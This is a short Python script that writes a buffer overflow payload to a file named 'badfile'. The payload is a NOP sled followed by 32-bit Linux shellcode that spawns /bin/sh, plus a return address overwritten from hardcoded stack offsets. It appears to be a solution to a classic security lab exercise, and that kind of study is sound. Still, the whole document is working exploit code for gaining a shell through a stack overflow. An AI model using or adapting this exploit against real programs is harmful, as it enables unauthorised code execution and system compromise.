#!/usr/bin/python3
import sys

shellcode= (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

##################################################################
# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Place the shellcode at the end of the payload to ensure it fits.
start = 517 - len(shellcode)
content[start:] = shellcode

# In this example, we're assuming a 32-bit architecture.
L = 4

##################################################################
# Calculate the offset to place the return address right after the buffer
offset = 0xbfffeb38 - 0xbfffeacc + L # The size of the buffer in the vulnerable program
# Use a debugger to find the correct return address.
ret = 0xbfffeacc + offset + 100 

content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')

##################################################################
# Write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)
